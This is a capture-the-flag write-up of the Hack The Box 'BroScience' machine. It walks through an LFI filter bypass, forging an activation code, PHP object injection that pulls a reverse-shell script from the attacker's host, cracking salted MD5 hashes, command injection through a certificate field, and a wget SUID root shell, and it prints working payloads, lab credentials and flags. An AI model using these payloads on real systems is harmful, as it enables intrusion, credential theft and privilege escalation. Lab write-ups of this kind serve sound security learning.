# BroScience - HTB(Medium)
## IP = 10.10.11.195

### NMAP 

```

PORT    STATE SERVICE VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:                                                       
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)        
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)       
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)     
80/tcp  open  http     Apache httpd 2.4.54 
|_http-title: Did not follow redirect to https://broscience.htb/     
| http-methods:                                                 
|_  Supported Methods: GET HEAD POST OPTIONS              
|_http-server-header: Apache/2.4.54 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))                          
| tls-alpn:                                        
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36
| Not valid after:  2023-07-14T19:48:36
| MD5:   5328ddd62f3429d11d26ae8a68d86e0c
|_SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b
|_http-title: BroScience : Home
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Enumeration

When entering the site it redirects you to the following url: https://broscience.htb so enter that in your /etc/hosts and you'll have access to the site. So I started with the regular enumeration tools, directory busting 


```

$ dirsearch -u https://broscience.htb/ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,tx
t,js                           
 
  _|. _ _  _  _  _ _|_    v0.4.2        
 (_||| _) (/_(_|| (_| )                                            
                                            
Extensions: php, txt, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/kali/.dirsearch/reports/broscience.htb/-_23-03-17_11-02-40.txt 

Error Log: /home/kali/.dirsearch/logs/errors-23-03-17_11-02-40.log

Target: https://broscience.htb/

[11:02:41] Starting: 
[11:02:43] 301 -  319B  - /images  ->  https://broscience.htb/images/
[11:02:48] 301 -  321B  - /includes  ->  https://broscience.htb/includes/
[11:02:49] 301 -  319B  - /manual  ->  https://broscience.htb/manual/
[11:02:55] 301 -  323B  - /javascript  ->  https://broscience.htb/javascript/
[11:03:00] 301 -  319B  - /styles  ->  https://broscience.htb/styles/
[11:19:47] 403 -  280B  - /server-status
```

So I started looking at each directory, and the includes directory was the most interesting and that is because of the `img.php` file, when entering that file it says: "Error: Missing 'path' parameter". Thats amazing so we know we have a `path` parameter and if it's using the `GET` function in php to get the value of the parameter there's a suspicion for LFI.
So I added the `path` parameter and entered the most basic payload: "../../../../../../../etc/passwd", it didn't work and it actually set an error: "Error: Attack detected". But that error didn't stop me, I used the LFI-Payload-List from the following github repo: https://github.com/emadshanab/LFI-Payload-List/blob/master/LFI%20payloads.txt with `ffuf` as follows:

```

$ ffuf -w lfi_payloads -u "https://broscience.htb/includes/img.php?path=FUZZ" -fw 3 -fl 1

        /'___\  /'___\           /'___\                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                          
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                           
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                    
         \ \_\   \ \_\  \ \____/  \ \_\                                               
          \/_/    \/_/   \/___/    \/_/                                                      
                                                                                                                   
       v2.0.0-dev                                                                  
________________________________________________                                            
                                                                                                                   
 :: Method           : GET            
 :: URL              : https://broscience.htb/includes/img.php?path=FUZZ 
 :: Wordlist         : FUZZ: /home/kali/Desktop/CTFs/HTB/active_machines/BroScience/lfi_payloads                                              
 :: Follow redirects : false          
 :: Calibration      : false          
 :: Timeout          : 10             
 :: Threads          : 40             
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500    
 :: Filter           : Response words: 3                                 
 :: Filter           : Response lines: 1                                                       
________________________________________________                                                                                              
                                        
[Status: 200, Size: 2235, Words: 26, Lines: 40, Duration: 203ms]                                                                              
    * FUZZ: %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34 

```

Boom! found a valid payload, now I waited a little because although that is a valid payload I couldn't really understand what's going on there so after a while the following payload popped up:

`..%252f..%252f..%252f..%252fetc%252fpasswd`

Now thats readable so I can work with it.


```

$ curl -k -s 'https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd' | grep "bash"
root:x:0:0:root:/root:/bin/bash
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

```

After a lot of searching I didn't really find something to help me get in the machine but I did find a way to log in the website. But before that I made a python script that would help us do that lfi much faster.

```
import sys
import os 
import urllib.parse

payload = sys.argv[1]
new_payload = urllib.parse.quote(payload, safe="")
new_payload = urllib.parse.quote(new_payload, safe="")

command = "curl -k -s 'https://broscience.htb/includes/img.php?path=" + new_payload + "'"
        
os.system(command)

```

This just runs the `curl` command with the payload it's just url encoded twice.

So back to the login, so I wanted to see some interesting stuff about the website so I started with some lfi payloads on already known files I saw in the website like login.php, register.php, etc. I stumbled upon the register.php file and saw how an account is created, the following grabbed my attention:

```
if (pg_num_rows($res) == 0) {
  // Create the account
  include_once 'includes/utils.php';
  $activation_code = generate_activation_code();
  $res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
  $res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));

  if (pg_num_rows($res) == 0) {
      $res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
      $res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));

      // TODO: Send the activation link to email
      $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
```

This part of the code uses a function called `generate_activation_code()` from the "/includes/utils.php" file. It uses this function to generate a code that will be added to a link that you need to access to activate your account at registration, but because this site doesn't send you the email you could't activate the account, so I looked at the `generate_activation_code()` function from the utils.php file:


```

function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

```

This function generates a code by picking a random character from the chars string, and it uses the time as the random number generators seed, that means if we are quick enough we can try to register and generate a code at the same time and the code would the be same one.

So I created a code.php file and I added this function but instead of returning it I echoed it so when I call the function I will see it on the screen. 

So entered some credentials and as soon as I pressed the register button I went and ran the file it generated me a string and I used that string I the url: https://broscience.htb/activate.php?code=41h7XMU0G4Pf5tgFL2USYgDCrbCPOwIY

BOOM! activated.

### Exploitation

Now you can see there is a new functionality available we can swap the theme of the site from light to dark and opposite, when displaying the /swap_theme.php file you can see the following:

```

// Swap the theme
include_once "includes/utils.php";
if (strcmp(get_theme(), "light") === 0) {
    set_theme("dark");
} else {
    set_theme("light");
}

```

The get and set functions come from a class from the utils.php file. And it looks like this:

```

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

```

We can see that in the `get_theme()` function we first serialize the UserPrefs object and base64 encode it and add it to the cookie called `user-prefs` then deserialize the base64 encoded cookie here is the problem when using the `unserialze()` method with a magic method it can cause PHP Object Injection. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.

In order for us to succeed with this attack we need to create a payload to pass the cookie that when deserialized will execute a reverse shell php script.

To do so we need to look further in the utils.php file:

```
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}
class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

```

Look at the following class this class uses the `__wakeup()` magic method, what's so magical you may ask, well this method is called automatically by PHP when a serialized object is getting deserialized. That is great because if we create a payload as an AvatarInterface class object and serialize it to then be deserialized as the cookie, it will call the `__wakeup()` method that creates a file and saves it at the server and that file could be a php reverse shell. So enough with the theoretical stuff lets start the fun.

1. First thing first lets create the payload, I copied the classes Avatar and AvatarInterface to a file and called it payload.php, in that file right under everything I entered the following command: `echo( urlencode(base64_encode(serialize(new AvatarInterface))) )` what this does is it creates a serialized AvatarInterface object, base64 encode it then url encode it. 
2. Now I made some changes to the AvatarInterface class it looks like this now:
```

class AvatarInterface {
    public $tmp = "http://10.10.15.9/rev.php";
    public $imgPath = "./rev.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

```

3. save the file and run it:
```
$ php payload.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNzoiaHR0cDovLzEwLjEwLjE1Ljkvc2hlbGwucGhwIjtzOjc6ImltZ1BhdGgiO3M6MTE6Ii4vc2hlbGwucGhwIjt9
```
we got ourselves a payload
4. Now you want to host a http server(`$ python3 -m http.server 80`) and send the payload as the user_pref cookie.
5. After that you want to open a netcat listener on the port you specified on your rev.php. `$ nc -lnvp 9999`
6. Last thing to do after forwarding the request go to the file you created which is rev.php like so: https://broscience.htb/rev.php 

```

$ nc -lnvp 9999                  
listening on [any] 9999 ...
connect to [10.10.15.9] from (UNKNOWN) [10.10.11.195] 38360
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
 14:51:19 up 1 day, 13:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-5.1$ whoami
www-data

```


### Post-Exploitation

Found DB creds:

```

bash-5.1$ cat db_connect.php 
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>bash-5.1$ psql -h localhost -p 5432 -U dbuser -W broscience -qtA
Password: RangeOfMotion%777

broscience=> SELECT usernames,password FROM users; 
administrator|15657792073e8a843d4f91fc403454e1
bill|13edad4932da9dbb57d9cd15b66ed104
michael|bd3dad50e2d578ecba87d5fa15ca5f85
john|a7eed23a7be6fe0d765197b1027453fe
dmytro|5d15340bded5b9395d5d14b9c21bc82b
0xfade|62d19f7e7ddcb5946728776d25e410ed

```

So we found the usernames the passwords, now we can try and crack it, but it won't work because we're missing a key thing here and it is the salt. Recall to the register.php file, you can see how an account is created, over there you can see how a password is created, 

`md5($db_salt . $_POST['password'])`

this is how a password is hashed, first it prefixes a salt to the plain password that entered then it uses md5 to hash the returned string. In the db_connect.php file you can see the salt: `$db_salt = "NaCl";` so we can append that salt to each hashed password and try to crack it with hashcat.

BroScience.txt
```
administrator:15657792073e8a843d4f91fc403454e1:NaCl
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
john:a7eed23a7be6fe0d765197b1027453fe:NaCl
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl
```

**Using Windows**:
```

> .\hashcat.exe -m 20 --username .\hashes\BroScience.txt ..\rockyou.txt -O
...Wait till it finishes... 

> .\hashcat.exe -m 20 --username .\hashes\BroScience.txt ..\rockyou.txt --show
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest

```

Great we got to bill's password and we know bill is a user from /etc/passwd lets login.


### SSH Login

```
$ ssh bill@broscience.htb
password: iluvhorsesandgym
-bash-5.1$ whoami && id && cat /home/bill/user.txt
bill
uid=1000(bill) gid=1000(bill) groups=1000(bill)
9716ea15530a87f3c7db8c6d3cd9c0ac
```

### Privilege Escalation  

After a little of enumeration I saw the following script is automated: `/bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt` so I went and checked the renew_cert.sh file and there is a certain command that's a little bit shady:

`openssl x509 -in $1 -noout -subject | cut -d "=" -f2-`

This command is bad, but good for us and I'll explain. When running openssl the `-subject` with a certificate it will output you all subjects in the certificate, those subjects refer to identity information e.g. Country, Company Name, etc. We can create a new certificate called "/home/bill/Certs/broscience.crt" and the automation command will run the script on certificate and if we enter in a payload in one of the subjects that will execute as soon as it will output the subjects that we could run command as root. So enough with the theoretical stuff and lets roll.


```

bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /ho
me/bill/Certs/broscience.crt -days 1 
Generating a RSA private key
........................................................................................++++
........................++++
writing new private key to '/home/bill/Certs/broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank   
For some fields there will be a default value,              
If you enter '.', the field will be left blank.             
-----
Country Name (2 letter code) [AU]:blabla                       
State or Province Name (full name) [Some-State]:blabla      
Locality Name (eg, city) []:blabla                       
Organization Name (eg, company) [Internet Widgits Pty Ltd]:blabla
Organizational Unit Name (eg, section) []:blabla           
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /usr/bin/wget)
Email Address []:0xfy@mamy.com

```

After a while you could verify the exploit worked by running:

```
bill@broscience:~/Certs$ find / -perm -4000 2>/dev/null | grep 'wget'
/usr/bin/wget
```

Now you can do the GTFObins wget suid privesc

```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0

```

```
# whoami && id && cat /root/root.txt
root
uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
7fa00c6547bcdaeec95d88d820cfe451
```

And thats root, thanks for tuning in, Cheers.
